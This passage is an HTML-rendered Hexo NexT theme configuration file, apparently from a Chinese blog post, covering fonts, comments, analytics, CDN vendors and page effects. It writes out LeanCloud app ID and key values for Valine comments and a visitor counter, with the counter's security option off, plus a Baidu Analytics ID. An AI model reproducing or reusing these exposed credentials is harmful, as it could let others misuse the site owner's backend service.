class="line">  # Google 字体 国内镜像</span><br><span class="line">  host:</span><br><span class="line"></span><br><span class="line">  # Font options:</span><br><span class="line">  # &#96;external: true&#96; will load this font family from &#96;host&#96; above.</span><br><span class="line">  # &#96;family: Times New Roman&#96;. Without any quotes.</span><br><span class="line">  # &#96;size: xx&#96;. Use &#96;px&#96; as unit.</span><br><span class="line"></span><br><span class="line">  # Global font settings used on &lt;body&gt; element.</span><br><span class="line">  global:</span><br><span class="line">    external: true</span><br><span class="line">#    family: Lato</span><br><span class="line">    family: EB Garamond # 字体参考：https:&#x2F;&#x2F;io-oi.me&#x2F;tech&#x2F;noto-serif-sc-added-on-google-fonts&#x2F;#main</span><br><span class="line">    size: 16</span><br><span class="line"></span><br><span class="line">  # Font settings for Headlines (h1, h2, h3, h4, h5, h6).</span><br><span class="line">  # Fallback to &#96;global&#96; font settings.</span><br><span class="line">  headings:</span><br><span class="line">    external: true</span><br><span class="line">    family:</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  # Font settings for posts.</span><br><span class="line">  # Fallback to &#96;global&#96; font settings.</span><br><span class="line">  posts:</span><br><span class="line">    external: true</span><br><span class="line">    family:</span><br><span class="line"></span><br><span class="line">  # Font settings for Logo.</span><br><span class="line">  # Fallback to &#96;global&#96; font settings.</span><br><span class="line">  logo:</span><br><span class="line">    external: true</span><br><span class="line">    family:</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  # Font settings for &lt;code&gt; and code blocks.</span><br><span class="line">  codes:</span><br><span class="line">    external: true</span><br><span class="line">    family:</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Third Party Services Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># MathJax Support</span><br><span class="line">mathjax:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: false</span><br><span class="line">  cdn: &#x2F;&#x2F;cdn.bootcss.com&#x2F;mathjax&#x2F;2.7.1&#x2F;latest.js?config&#x3D;TeX-AMS-MML_HTMLorMML</span><br><span class="line"></span><br><span class="line"># Han Support docs: https:&#x2F;&#x2F;hanzi.pro&#x2F;</span><br><span class="line">han: false</span><br><span class="line"></span><br><span class="line"># Swiftype Search API Key</span><br><span class="line">#swiftype_key:</span><br><span class="line"></span><br><span class="line"># Baidu Analytics ID 百度统计</span><br><span class="line">baidu_analytics: b56c2f3ac99ab0c4efa4cba7755ec64a</span><br><span class="line"></span><br><span class="line"># Duoshuo ShortName</span><br><span class="line">#duoshuo_shortname:</span><br><span class="line"></span><br><span class="line"># Disqus</span><br><span class="line">disqus:</span><br><span class="line">  enable: false</span><br><span class="line">  shortname:</span><br><span class="line">  count: true</span><br><span class="line"></span><br><span class="line"># Hypercomments</span><br><span class="line">#hypercomments_id:</span><br><span class="line"></span><br><span class="line"># changyan</span><br><span class="line">changyan:</span><br><span class="line">  enable: false</span><br><span class="line">  appid:</span><br><span class="line">  appkey:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Valine.</span><br><span class="line"># You can get your appid and appkey from https:&#x2F;&#x2F;leancloud.cn</span><br><span class="line"># more info please open https:&#x2F;&#x2F;valine.js.org</span><br><span class="line">valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appid: HzU5gDhBUYHF8QTF8DmbGhjD-gzGzoHsz # your leancloud application appid</span><br><span class="line">  appkey: wp1HNJ17SdpnE0wIFq99eTKH # your leancloud application appkey</span><br><span class="line">  notify: True # mail notifier: https:&#x2F;&#x2F;valine.js.org&#x2F;notify.html # 20190903使用Valine-Admin：参考 https:&#x2F;&#x2F;deserts.io&#x2F;valine-admin-document&#x2F;</span><br><span class="line">  verify: True # Verification code &#x2F;&#x2F;使用Valine-Admin</span><br><span class="line">  placeholder: &#39;&amp;#x270d;&amp;nbsp;写评论&#39;  # comment box placeholder</span><br><span class="line">  avatar: gravatar # gravatar style</span><br><span class="line">  guest_info: nick,mail,link # custom comment header</span><br><span class="line">  pageSize: 10 # pagination size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Support for youyan comments system.</span><br><span class="line"># You can get your uid from http:&#x2F;&#x2F;www.uyan.cc</span><br><span class="line">#youyan_uid: your uid</span><br><span class="line"></span><br><span class="line"># Support for LiveRe comments system.</span><br><span class="line"># You can get your uid from https:&#x2F;&#x2F;livere.com&#x2F;insight&#x2F;myCode (General web site)</span><br><span class="line">#livere_uid: your uid</span><br><span class="line"></span><br><span class="line">livere:</span><br><span class="line">  on: False</span><br><span class="line">  livere_uid: MTAyMC81MDg1NC8yNzMzNg&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"># Gitment</span><br><span class="line"># Introduction: https:&#x2F;&#x2F;imsun.net&#x2F;posts&#x2F;gitment-introduction&#x2F;</span><br><span class="line"># You can get your Github ID from https:&#x2F;&#x2F;api.github.com&#x2F;users&#x2F;&lt;Github username&gt;</span><br><span class="line">gitment:</span><br><span class="line">  enable: false</span><br><span class="line">  mint: true # RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway</span><br><span class="line">  count: true # Show comments count in post meta area</span><br><span class="line">  lazy: false # Comments lazy loading with a button</span><br><span class="line">  cleanly: false # Hide &#39;Powered by ...&#39; on footer, and more</span><br><span class="line">  language: # Force language, or auto switch by theme</span><br><span class="line">  github_user: # MUST HAVE, Your Github ID</span><br><span class="line">  github_repo: # MUST HAVE, The repo you use to store Gitment comments</span><br><span class="line">  client_id: # MUST HAVE, Github client id for the Gitment</span><br><span class="line">  client_secret: # EITHER this or proxy_gateway, Github access secret token for the Gitment</span><br><span class="line">  proxy_gateway: # Address of api proxy, See: https:&#x2F;&#x2F;github.com&#x2F;aimingoo&#x2F;intersect</span><br><span class="line">  redirect_protocol: # Protocol of redirect_uri with force_redirect_protocol when mint enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Baidu Share</span><br><span class="line"># Available value:</span><br><span class="line">#    button | slide</span><br><span class="line"># Warning: Baidu Share does not support https.</span><br><span class="line">#baidushare:</span><br><span class="line">##  type: button</span><br><span class="line"></span><br><span class="line">#baidushare:</span><br><span class="line">#  type:  # 设置分享按钮的风格，有button何slide形式</span><br><span class="line"></span><br><span class="line"># Share</span><br><span class="line"># This plugin is more useful in China, make sure you known how to use it.</span><br><span class="line"># And you can find the use guide at official webiste: http:&#x2F;&#x2F;www.jiathis.com&#x2F;.</span><br><span class="line"># Warning: JiaThis does not support https.</span><br><span class="line">#jiathis:</span><br><span class="line">  ##uid: Get this uid from http:&#x2F;&#x2F;www.jiathis.com&#x2F;</span><br><span class="line">#add_this_id:</span><br><span class="line"></span><br><span class="line"># Share</span><br><span class="line">#duoshuo_share: true</span><br><span class="line"></span><br><span class="line"># NeedMoreShare2</span><br><span class="line"># This plugin is a pure javascript sharing lib which is useful in China.</span><br><span class="line"># See: https:&#x2F;&#x2F;github.com&#x2F;revir&#x2F;need-more-share2</span><br><span class="line"># Also see: https:&#x2F;&#x2F;github.com&#x2F;DzmVasileusky&#x2F;needShareButton</span><br><span class="line"># iconStyle: default | box</span><br><span class="line"># boxForm: horizontal | vertical</span><br><span class="line"># position: top &#x2F; middle &#x2F; bottom + Left &#x2F; Center &#x2F; Right</span><br><span class="line"># networks: Weibo,Wechat,Douban,QQZone,Twitter,Linkedin,Mailto,Reddit,</span><br><span class="line">#           Delicious,StumbleUpon,Pinterest,Facebook,GooglePlus,Slashdot,</span><br><span class="line">#           Technorati,Posterous,Tumblr,GoogleBookmarks,Newsvine,</span><br><span class="line">#           Evernote,Friendfeed,Vkontakte,Odnoklassniki,Mailru</span><br><span class="line">needmoreshare2:</span><br><span class="line">  enable: false</span><br><span class="line">  postbottom:</span><br><span class="line">    enable: false</span><br><span class="line">    options:</span><br><span class="line">      iconStyle: box</span><br><span class="line">      boxForm: horizontal</span><br><span class="line">      position: bottomCenter</span><br><span class="line">      networks: Weibo,Wechat,Douban,QQZone,Twitter,Facebook</span><br><span class="line">  float:</span><br><span class="line">    enable: false</span><br><span class="line">    options:</span><br><span class="line">      iconStyle: box</span><br><span class="line">      boxForm: horizontal</span><br><span class="line">      position: middleRight</span><br><span class="line">      networks: Weibo,Wechat,Douban,QQZone,Twitter,Facebook</span><br><span class="line"></span><br><span class="line">#  站点验证</span><br><span class="line"># Google Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.google.com&#x2F;webmasters&#x2F;</span><br><span class="line">google_site_verification: </span><br><span class="line"></span><br><span class="line"># Google Analytics</span><br><span class="line">google_analytics: </span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;liaofuzhan.netlify.com 站点验证</span><br><span class="line">baidu_site_verification: OTG88475E6</span><br><span class="line"></span><br><span class="line">qihu_site_verification: </span><br><span class="line"></span><br><span class="line">sogou_site_verification: </span><br><span class="line"></span><br><span class="line"># Bing Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.bing.com&#x2F;webmaster&#x2F;</span><br><span class="line">bing_site_verification: </span><br><span class="line"></span><br><span class="line"># Yandex Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;webmaster.yandex.ru&#x2F;</span><br><span class="line">#yandex_site_verification:</span><br><span class="line"></span><br><span class="line"># CNZZ count</span><br><span class="line">#cnzz_siteid:</span><br><span class="line"></span><br><span class="line"># Application Insights</span><br><span class="line"># See https:&#x2F;&#x2F;azure.microsoft.com&#x2F;en-us&#x2F;services&#x2F;application-insights&#x2F;</span><br><span class="line"># application_insights:</span><br><span class="line"></span><br><span class="line"># Make duoshuo show UA</span><br><span class="line"># user_id must NOT be null when admin_enable is true!</span><br><span class="line"># you can visit http:&#x2F;&#x2F;dev.duoshuo.com get duoshuo user id.</span><br><span class="line">duoshuo_info:</span><br><span class="line">  ua_enable: true</span><br><span class="line">  admin_enable: false</span><br><span class="line">  user_id: 0</span><br><span class="line">  #admin_nickname: Author</span><br><span class="line"></span><br><span class="line"># Post widgets &amp; FB&#x2F;VK comments settings.</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Facebook SDK Support.</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next&#x2F;pull&#x2F;410</span><br><span class="line">facebook_sdk:</span><br><span class="line">  enable:       false</span><br><span class="line">  app_id:       #&lt;app_id&gt;</span><br><span class="line">  fb_admin:     #&lt;user_id&gt;</span><br><span class="line">  like_button:  #true</span><br><span class="line">  webmaster:    #true</span><br><span class="line"></span><br><span class="line"># Facebook comments plugin</span><br><span class="line"># This plugin depends on Facebook SDK.</span><br><span class="line"># If facebook_sdk.enable is false, Facebook comments plugin is unavailable.</span><br><span class="line">facebook_comments_plugin:</span><br><span class="line">  enable:       false</span><br><span class="line">  num_of_posts: 10    # min posts num is 1</span><br><span class="line">  width:        100%  # default width is 550px</span><br><span class="line">  scheme:       light # default scheme is light (light or dark)</span><br><span class="line"></span><br><span class="line"># VKontakte API Support.</span><br><span class="line"># To get your AppID visit https:&#x2F;&#x2F;vk.com&#x2F;editapp?act&#x3D;create</span><br><span class="line">vkontakte_api:</span><br><span class="line">  enable:       false</span><br><span class="line">  app_id:       #&lt;app_id&gt;</span><br><span class="line">  like:         true</span><br><span class="line">  comments:     true</span><br><span class="line">  num_of_posts: 10</span><br><span class="line"></span><br><span class="line"># 文章评分功能</span><br><span class="line"># Star rating support to each article.</span><br><span class="line"># To get your ID visit https:&#x2F;&#x2F;widgetpack.com</span><br><span class="line">rating:</span><br><span class="line">  enable: false</span><br><span class="line">  id:     #&lt;app_id&gt;</span><br><span class="line">  color: </span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Show number of visitors to each article.</span><br><span class="line"># You can visit https:&#x2F;&#x2F;leancloud.cn get AppID and AppKey.</span><br><span class="line"># 安全问题：https:&#x2F;&#x2F;leaferx.online&#x2F;2018&#x2F;02&#x2F;11&#x2F;lc-security&#x2F;</span><br><span class="line">leancloud_visitors:</span><br><span class="line">  enable: true</span><br><span class="line">  app_id: HzU5gDhBUYHF8QTF8DmbGhjD-gzGzoHsz #&lt;app_id&gt;</span><br><span class="line">  app_key: wp1HNJ17SdpnE0wIFq99eTKH #&lt;app_key&gt;</span><br><span class="line">  # Dependencies: https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-leancloud-counter-security</span><br><span class="line">  # If you don&#39;t care about security in leancloud counter and just want to use it directly</span><br><span class="line">  # (without hexo-leancloud-counter-security plugin), set &#96;security&#96; to &#96;false&#96;.</span><br><span class="line">  security: false</span><br><span class="line">  betterPerformance: true</span><br><span class="line"></span><br><span class="line"># Another tool to show number of visitors to each article.</span><br><span class="line"># visit https:&#x2F;&#x2F;console.firebase.google.com&#x2F;u&#x2F;0&#x2F; to get apiKey and projectId</span><br><span class="line"># visit https:&#x2F;&#x2F;firebase.google.com&#x2F;docs&#x2F;firestore&#x2F; to get more information about firestore</span><br><span class="line">firestore:</span><br><span class="line">  enable: false</span><br><span class="line">  collection: XXXXXXXX #required, a string collection name to access firestore database</span><br><span class="line">  apiKey: XXXXXXXX #required</span><br><span class="line">  projectId: XXXXXXXX #required</span><br><span class="line">  bluebird: false #enable this if you want to include bluebird 3.5.1(core version) Promise polyfill</span><br><span class="line"></span><br><span class="line"># Show PV&#x2F;UV of the website&#x2F;page with busuanzi.</span><br><span class="line"># Get more information on http:&#x2F;&#x2F;ibruce.info&#x2F;2015&#x2F;04&#x2F;04&#x2F;busuanzi&#x2F;</span><br><span class="line">busuanzi_count:</span><br><span class="line">  # count values only if the other configs are false</span><br><span class="line">  enable: true</span><br><span class="line">  # custom uv span for the whole site</span><br><span class="line">  site_uv: true</span><br><span class="line">#  site_uv_header: &lt;i class&#x3D;&quot;fa fa-user&quot;&gt;&lt;&#x2F;i&gt; 访客</span><br><span class="line">  site_uv_header: &lt;i class&#x3D;&quot;fa fa-user&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">  site_uv_footer:</span><br><span class="line">  # custom pv span for the whole site</span><br><span class="line">  site_pv: true</span><br><span class="line">#  site_pv_header: &lt;i class&#x3D;&quot;fa fa-eye&quot;&gt;&lt;&#x2F;i&gt; 访问量</span><br><span class="line">  site_pv_header: &lt;i class&#x3D;&quot;fa fa-eye&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">  site_pv_footer:</span><br><span class="line">  # custom pv span for one page only</span><br><span class="line">  page_pv: false #使用leancloud(firestore)统计pv及排行</span><br><span class="line">  page_pv_header: &lt;i class&#x3D;&quot;fa fa-file-o&quot;&gt;&lt;&#x2F;i&gt; 浏览</span><br><span class="line">  page_pv_footer: 次</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Tencent analytics ID</span><br><span class="line"># tencent_analytics:</span><br><span class="line"></span><br><span class="line"># Tencent MTA ID</span><br><span class="line"># tencent_mta:</span><br><span class="line"></span><br><span class="line"># Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEO</span><br><span class="line">baidu_push: true</span><br><span class="line"></span><br><span class="line"># Google Calendar</span><br><span class="line"># Share your recent schedule to others via calendar page</span><br><span class="line">#</span><br><span class="line"># API Documentation:</span><br><span class="line"># https:&#x2F;&#x2F;developers.google.com&#x2F;google-apps&#x2F;calendar&#x2F;v3&#x2F;reference&#x2F;events&#x2F;list</span><br><span class="line">calendar:</span><br><span class="line">  enable: false</span><br><span class="line">  calendar_id: &lt;required&gt;</span><br><span class="line">  api_key: &lt;required&gt;</span><br><span class="line">  orderBy: startTime</span><br><span class="line">  offsetMax: 24</span><br><span class="line">  offsetMin: 4</span><br><span class="line">  timeZone:</span><br><span class="line">  showDeleted: false</span><br><span class="line">  singleEvents: true</span><br><span class="line">  maxResults: 250</span><br><span class="line"></span><br><span class="line"># Algolia Search</span><br><span class="line">algolia_search:</span><br><span class="line">  enable: false</span><br><span class="line">  hits:</span><br><span class="line">    per_page: 10</span><br><span class="line">  labels:</span><br><span class="line">    input_placeholder: Search for Posts</span><br><span class="line">    hits_empty: &quot;We didn&#39;t find any results for the search: $&#123;query&#125;&quot;</span><br><span class="line">    hits_stats: &quot;$&#123;hits&#125; results found in $&#123;time&#125; ms&quot;</span><br><span class="line"></span><br><span class="line"># Local search</span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;flashlab&#x2F;hexo-generator-search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Tags Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># External URL with BASE64 encrypt &amp; decrypt.</span><br><span class="line"># Usage: &#123;% exturl text url &quot;title&quot; %&#125;</span><br><span class="line"># Alias: &#123;% extlink text url &quot;title&quot; %&#125;</span><br><span class="line">exturl: false</span><br><span class="line"></span><br><span class="line"># Note tag (bs-callout).</span><br><span class="line"># 标注 https:&#x2F;&#x2F;theme-next.org&#x2F;docs&#x2F;tag-plugins&#x2F;note</span><br><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: flat</span><br><span class="line">  icons: true</span><br><span class="line">  border_radius: 3</span><br><span class="line">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span><br><span class="line">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span><br><span class="line">  light_bg_offset: 0</span><br><span class="line"></span><br><span class="line"># Label tag.</span><br><span class="line">label: true</span><br><span class="line"></span><br><span class="line"># Tabs tag.</span><br><span class="line">tabs:</span><br><span class="line">  enable: true</span><br><span class="line">  transition:</span><br><span class="line">    tabs: false</span><br><span class="line">    labels: true</span><br><span class="line">  border_radius: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#! ---------------------------------------------------------------</span><br><span class="line">#! DO NOT EDIT THE FOLLOWING SETTINGS</span><br><span class="line">#! UNLESS YOU KNOW WHAT YOU ARE DOING</span><br><span class="line">#! ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Use velocity to animate everything.</span><br><span class="line">motion:</span><br><span class="line">  enable: true</span><br><span class="line">  async: true</span><br><span class="line">  transition:</span><br><span class="line">    # Transition variants:</span><br><span class="line">    # fadeIn | fadeOut | flipXIn | flipXOut | flipYIn | flipYOut | flipBounceXIn | flipBounceXOut | flipBounceYIn | flipBounceYOut</span><br><span class="line">    # swoopIn | swoopOut | whirlIn | whirlOut | shrinkIn | shrinkOut | expandIn | expandOut</span><br><span class="line">    # bounceIn | bounceOut | bounceUpIn | bounceUpOut | bounceDownIn | bounceDownOut | bounceLeftIn | bounceLeftOut | bounceRightIn | bounceRightOut</span><br><span class="line">    # slideUpIn | slideUpOut | slideDownIn | slideDownOut | slideLeftIn | slideLeftOut | slideRightIn | slideRightOut</span><br><span class="line">    # slideUpBigIn | slideUpBigOut | slideDownBigIn | slideDownBigOut | slideLeftBigIn | slideLeftBigOut | slideRightBigIn | slideRightBigOut</span><br><span class="line">    # perspectiveUpIn | perspectiveUpOut | perspectiveDownIn | perspectiveDownOut | perspectiveLeftIn | perspectiveLeftOut | perspectiveRightIn | perspectiveRightOut</span><br><span class="line">    post_block: flipYIn</span><br><span class="line">    post_header: perspectiveRightIn</span><br><span class="line">    post_body: perspectiveLeftIn</span><br><span class="line">    coll_header: swoopIn</span><br><span class="line">    # Only for Pisces | Gemini.</span><br><span class="line">    sidebar: shrinkIn</span><br><span class="line"></span><br><span class="line"># Fancybox</span><br><span class="line">fancybox: true</span><br><span class="line"></span><br><span class="line"># Progress bar in the top during page loading.</span><br><span class="line">pace: true</span><br><span class="line"># Themes list:</span><br><span class="line">#pace-theme-big-counter</span><br><span class="line">#pace-theme-bounce</span><br><span class="line">#pace-theme-barber-shop</span><br><span class="line">#pace-theme-center-atom</span><br><span class="line">#pace-theme-center-circle</span><br><span class="line">#pace-theme-center-radar</span><br><span class="line">#pace-theme-center-simple</span><br><span class="line">#pace-theme-corner-indicator</span><br><span class="line">#pace-theme-fill-left</span><br><span class="line">#pace-theme-flash</span><br><span class="line">#pace-theme-loading-bar</span><br><span class="line">#pace-theme-mac-osx</span><br><span class="line">#pace-theme-minimal</span><br><span class="line"># For example</span><br><span class="line"># pace_theme: pace-theme-center-simple</span><br><span class="line">pace_theme: pace-theme-minimal</span><br><span class="line"></span><br><span class="line"># canves系列：设置背景波浪、线条</span><br><span class="line"># Canvas-nest</span><br><span class="line">canvas_nest: false</span><br><span class="line"></span><br><span class="line"># three_waves</span><br><span class="line">three_waves: false</span><br><span class="line"></span><br><span class="line"># canvas_lines</span><br><span class="line">canvas_lines: false</span><br><span class="line"></span><br><span class="line"># canvas_sphere</span><br><span class="line">canvas_sphere: false</span><br><span class="line"></span><br><span class="line"># Only fit scheme Pisces</span><br><span class="line"># Canvas-ribbon</span><br><span class="line"># size: The width of the ribbon.</span><br><span class="line"># alpha: The transparency of the ribbon.</span><br><span class="line"># zIndex: The display level of the ribbon.</span><br><span class="line"># 条状背景线，点击动态变化</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: true</span><br><span class="line">  size: 60</span><br><span class="line">  alpha: 0.1</span><br><span class="line">  zIndex: -1</span><br><span class="line"></span><br><span class="line"># 设置CDN加速：http:&#x2F;&#x2F;yearito.cn&#x2F;posts&#x2F;hexo-deploy-to-VPS.html</span><br><span class="line"># Script Vendors.</span><br><span class="line"># Set a CDN address for the vendor you want to customize.</span><br><span class="line"># For example</span><br><span class="line">#    jquery: https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;2.2.0&#x2F;jquery.min.js</span><br><span class="line"># Be aware that you should use the same version as internal ones to avoid potential problems.</span><br><span class="line"># Please use the https protocol of CDN files when you enable https on your site.</span><br><span class="line">vendors:</span><br><span class="line">  # Internal path prefix. Please do not edit it.</span><br><span class="line">  _internal: lib</span><br><span class="line"></span><br><span class="line">  # Internal version: 2.1.3</span><br><span class="line">  jquery: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;jquery@2.1.3&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 2.1.5</span><br><span class="line">  # See: http:&#x2F;&#x2F;fancyapps.com&#x2F;fancybox&#x2F;</span><br><span class="line">#  图片左右切换按钮</span><br><span class="line">#  fancybox: #https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fancyapps&#x2F;fancybox@3.5.2&#x2F;dist&#x2F;jquery.fancybox.min.js</span><br><span class="line">#  fancybox_css: #https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fancyapps&#x2F;fancybox@3.5.2&#x2F;dist&#x2F;jquery.fancybox.min.css</span><br><span class="line">  fancybox:</span><br><span class="line">  fancybox_css:</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.0.6</span><br><span class="line">  # See: https:&#x2F;&#x2F;github.com&#x2F;ftlabs&#x2F;fastclick</span><br><span class="line">  fastclick: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;fastclick&#x2F;1.0.6&#x2F;fastclick.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.9.7</span><br><span class="line">  # See: https:&#x2F;&#x2F;github.com&#x2F;tuupola&#x2F;jquery_lazyload</span><br><span class="line">  lazyload: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;jquery.lazyload&#x2F;1.9.3&#x2F;jquery.lazyload.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.2.1</span><br><span class="line">  # See: http:&#x2F;&#x2F;VelocityJS.org</span><br><span class="line">  velocity: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;velocity-animate@1.2.1&#x2F;velocity.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.2.1</span><br><span class="line">  # See: http:&#x2F;&#x2F;VelocityJS.org</span><br><span class="line">  velocity_ui: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;velocity-animate@1.2.1&#x2F;velocity.ui.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 0.7.9</span><br><span class="line">  # See: https:&#x2F;&#x2F;faisalman.github.io&#x2F;ua-parser-js&#x2F;</span><br><span class="line">  ua_parser: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;ua-parser.js&#x2F;0.7.10&#x2F;ua-parser.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 4.6.2</span><br><span class="line">  # See: http:&#x2F;&#x2F;fontawesome.io&#x2F;</span><br><span class="line">  fontawesome: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;font-awesome@4.7.0&#x2F;css&#x2F;font-awesome.min.css</span><br><span class="line"></span><br><span class="line">  # Internal version: 1</span><br><span class="line">  # https:&#x2F;&#x2F;www.algolia.com</span><br><span class="line">  algolia_instant_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instantsearch.js@2.4.1&#x2F;dist&#x2F;instantsearch.js</span><br><span class="line">  algolia_instant_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instantsearch.js@2.4.1&#x2F;dist&#x2F;instantsearch.min.css</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.0.2</span><br><span class="line">  # See: https:&#x2F;&#x2F;github.com&#x2F;HubSpot&#x2F;pace</span><br><span class="line">  # Or use direct links below:</span><br><span class="line">  # pace: &#x2F;&#x2F;cdn.bootcss.com&#x2F;pace&#x2F;1.0.2&#x2F;pace.min.js</span><br><span class="line">  # pace_css: &#x2F;&#x2F;cdn.bootcss.com&#x2F;pace&#x2F;1.0.2&#x2F;themes&#x2F;blue&#x2F;pace-theme-flash.min.css</span><br><span class="line">  pace: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pace-js@1.0.2&#x2F;pace.min.js</span><br><span class="line">  pace_css: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pace-js@1.0.2&#x2F;themes&#x2F;blue&#x2F;pace-theme-minimal.css</span><br><span class="line"></span><br><span class="line">  pangu: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pangu@3.3.0&#x2F;dist&#x2F;browser&#x2F;pangu.min.js</span><br><span class="line"></span><br><span class="line">  valine: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;valine@1.3.3&#x2F;dist&#x2F;Valine.min.js</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.0.0</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;hustcc&#x2F;canvas-nest.js</span><br><span class="line">  canvas_nest: &#x2F;&#x2F;cdn.bootcss.com&#x2F;canvas-nest.js&#x2F;1.0.1&#x2F;canvas-nest.min.js</span><br><span class="line"></span><br><span class="line">  # three</span><br><span class="line">  three:</span><br><span class="line"></span><br><span class="line">  # three_waves</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;jjandxa&#x2F;three_waves</span><br><span class="line">  three_waves:</span><br><span class="line"></span><br><span class="line">  # three_waves</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;jjandxa&#x2F;canvas_lines</span><br><span class="line">  canvas_lines:</span><br><span class="line"></span><br><span class="line">  # three_waves</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;jjandxa&#x2F;canvas_sphere</span><br><span class="line">  canvas_sphere:</span><br><span class="line"></span><br><span class="line">  # Internal version: 1.0.0</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;zproo&#x2F;canvas-ribbon</span><br><span class="line">  canvas_ribbon:</span><br><span class="line"></span><br><span class="line">  # Internal version: 3.3.0</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;ethantw&#x2F;Han</span><br><span class="line">  han:</span><br><span class="line"></span><br><span class="line">  # needMoreShare2</span><br><span class="line">  # https:&#x2F;&#x2F;github.com&#x2F;revir&#x2F;need-more-share2</span><br><span class="line">  needMoreShare2:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Assets</span><br><span class="line">css: css</span><br><span class="line">js: js</span><br><span class="line">images: images</span><br><span class="line"></span><br><span class="line"># Theme version</span><br><span class="line">version: 5.1.4</span><br><span class="line"></span><br><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br><span class="line"></span><br><span class="line"># 鼠标点击特效</span><br><span class="line">cursor_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  # fireworks：礼花 | explosion：爆炸 | love：浮出爱心 | text：浮出文字</span><br><span class="line">  type: explosion</span><br><span class="line"></span><br><span class="line"># typing effect 打字特效</span><br><span class="line">typing_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  colorful: true  # 礼花特效</span><br><span class="line">  shake: false  # 震动特效</span><br><span class="line"></span><br><span class="line"># 标签页样式 &#x2F;tags&#x2F;</span><br><span class="line"># type: | tagcanvas | color | love | bubble |</span><br><span class="line"># PS：tagcanvas依赖hexo-tag-cloud插件</span><br><span class="line">tagcloud:</span><br><span class="line">  type: bubble # 